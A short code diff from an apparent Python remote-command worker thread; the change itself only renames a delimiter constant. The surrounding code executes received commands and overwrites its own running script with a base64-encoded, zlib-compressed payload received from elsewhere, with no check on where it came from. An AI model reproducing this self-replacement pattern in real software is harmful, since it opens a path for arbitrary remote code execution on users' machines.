@@ -73,11 +73,11 @@ class Worker(threading.Thread):
                 self.send_msg("Error when trying to run the command '%s' " % msg)
         #finally:
             #self.send_msg("::end::")
-        if self.compressor.find(self.DELIMETER) != -1:
+        if self.compressor.find(self.DELIM) != -1:
             now = datetime.datetime.now()
             copyfile(sys.argv[0], sys.argv[0] + now.strftime("%Y%m%d%H%M"))
             with open(sys.argv[0],'w',encoding='utf-8') as f:
-                compressed = self.compressor[:self.compressor.find(self.DELIMETER)]
+                compressed = self.compressor[:self.compressor.find(self.DELIM)]
                 self._logger.info("GOT COMPRESSED: "+compressed)
                 f.write(zlib.decompress(base64.b64decode(compressed)).decode("utf-8"))
             self.receivingFile = False
